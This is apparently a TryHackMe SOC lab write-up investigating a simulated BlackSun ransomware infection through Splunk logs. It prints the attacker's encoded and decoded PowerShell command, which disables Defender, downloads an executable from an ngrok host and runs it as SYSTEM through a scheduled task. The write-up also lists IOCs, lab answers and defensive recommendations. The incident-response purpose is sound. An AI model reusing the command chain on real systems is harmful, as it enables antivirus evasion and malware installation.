# SOC Investigation: Ransomware Attack on Keegan's Machine

**Platform:** TryHackMe (simulated as "TryNotHackMe" MSSP scenario)
**Role:** SOC Analyst
**Tools Used:** Splunk, CyberChef, VirusTotal

## Scenario

As a SOC Analyst working for an MSSP (Managed Security Service Provider) called TryNotHackMe, I was tasked with investigating a potential ransomware incident on a client's endpoint.

A customer reported unusual activity on a machine belonging to a user named Keegan. The incident occurred on **Monday, May 16th, 2022**. The machine was still operational, but several files had been renamed with an unusual file extension — a possible indicator of ransomware. My manager asked me to review the available logs in Splunk to determine the root cause and scope of the incident.

**Lab access:** The Splunk instance was accessed via the Attack Box / OpenVPN at `10.130.128.82`.

---

## Investigation & Findings

### 1. Identifying the Suspicious Binary

To begin the investigation, I narrowed the search window to Monday, May 16th, 2022, and applied the following filter in Splunk:

```
index=* User="DESKTOP-TBV8NEF\keegan"
```

Reviewing the top values of the `CommandLine` field revealed a Base64-encoded PowerShell command:

```
powershell.exe -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA
```

Using **CyberChef** (From Base64 → Decode Text UTF-16LE) to decode the payload, I recovered the following plaintext command:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;
wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;
SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\OUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;
SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
```

**Breakdown of the command:**

| Segment | Purpose |
|---|---|
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Disables Microsoft Defender's real-time monitoring to evade detection |
| `wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe` | Downloads the malicious binary from an ngrok tunnel (a free service commonly abused by attackers) and saves it to the `Temp` directory — a common target since it is writable and typically less monitored |
| `SCHTASKS /Create ... /RU "SYSTEM"` | Creates a scheduled task that triggers the binary whenever Event ID 777 appears in the Application log, running with `SYSTEM` (elevated) privileges |
| `SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"` | Immediately executes the scheduled task |

**Answer:** `OUTSTANDING_GUTTER.exe`

---

### 2. Source Address of the Download

Defanging the URL in CyberChef to safely document it:

**Answer:** `hxxp[://]886e-181-215-214-32[.]ngrok[.]io`

---

### 3. Executable Used to Perform the Download

The `CommandLine` field showed that PowerShell was responsible for the download. Checking the `Image` field confirmed the full binary path.

**Answer:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

---

### 4. Command Used to Configure Persistence / Elevated privileges for Execution

**Answer:**
```
"C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\OUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
```

---

### 5. Privileges and Command Used to Run the Binary

**Answer (Format: User;CommandLine):**
```
NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe
```

---

### 6. Remote Server Contacted by the Binary

By filtering for DNS queries initiated by the malicious executable, I identified a second ngrok address used for command-and-control (C2) communication.

![](images/Capture%20d’écran%202026-06-11%20201711.png)  

**Answer:** `hxxp[://]9030-181-215-214-32[.]ngrok[.]io`

---

### 7. PowerShell Script Downloaded to the Same Location

Since the malicious binary was written to `C:\Windows\Temp\`, I searched for other PowerShell-related files in the same directory:

```
index=* "*.ps*" AND "*C:\\Windows\\Temp\\*"
```

**Answer:** `script.ps1`

---

### 8. Identifying the True Name of the Malicious Script

The file `script.ps1` appeared to have been renamed to something generic, likely to evade detection. To determine its original identity, I extracted its file hash from Splunk and submitted it to **VirusTotal** for threat intelligence lookup.

**Answer:** `BlackSun.ps1`

---

### 9. Location of the Ransom Note

Examining the directory where the script executed revealed several files with their extensions changed to `.BlackSun` — confirming that ransomware encryption had occurred following execution of `script.ps1`. A ransom note was also dropped in the same directory.

**Answer:** `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`

---

### 10. Desktop Wallpaper Replacement Image

The script also modified the victim's desktop wallpaper as a visual indicator of compromise (IOC).

**Answer:** `C:\Users\Public\Pictures\blacksun.jpg`

---

## Summary of Key Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Malicious binary | `OUTSTANDING_GUTTER.exe` |
| Download source | `hxxp[://]886e-181-215-214-32[.]ngrok[.]io` |
| C2 server | `hxxp[://]9030-181-215-214-32[.]ngrok[.]io` |
| Malicious script (original name) | `BlackSun.ps1` |
| Ransom note path | `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt` |
| Wallpaper IOC | `C:\Users\Public\Pictures\blacksun.jpg` |
| Encrypted file extension | `.BlackSun` |

## Attack Chain Summary

1. A PowerShell command, delivered via an encoded (`-enc`) payload, disabled Windows Defender's real-time protection.
2. The command downloaded a binary (`OUTSTANDING_GUTTER.exe`) from an ngrok-hosted URL into `C:\Windows\Temp\`.
3. A scheduled task was created to execute the binary with `SYSTEM` privileges whenever Event ID 777 was logged, then triggered immediately.
4. The binary retrieved and executed a second-stage PowerShell script (`script.ps1`, actually `BlackSun.ps1`) from the same directory.
5. The script communicated with a separate ngrok-hosted C2 server, encrypted files on disk (renaming them with a `.BlackSun` extension), dropped a ransom note, and replaced the desktop wallpaper to notify the victim.

## Lessons Learned / Recommendations

- Monitor and alert on the use of `-enc` (encoded) PowerShell commands, as these are frequently used to obfuscate malicious payloads.
- Treat any command that disables Windows Defender (`Set-MpPreference -DisableRealtimeMonitoring`) as a high-severity alert.
- Flag outbound connections to ngrok domains (`*.ngrok.io`), as they are commonly abused for malware delivery and C2 infrastructure.
- Monitor scheduled task creation, especially tasks configured to run with `SYSTEM` privileges or triggered by unusual event conditions.
- Maintain offline, immutable backups to reduce the impact of ransomware encryption.

---

*This write-up documents a hands-on SOC investigation lab completed as part of my cybersecurity training and portfolio.*
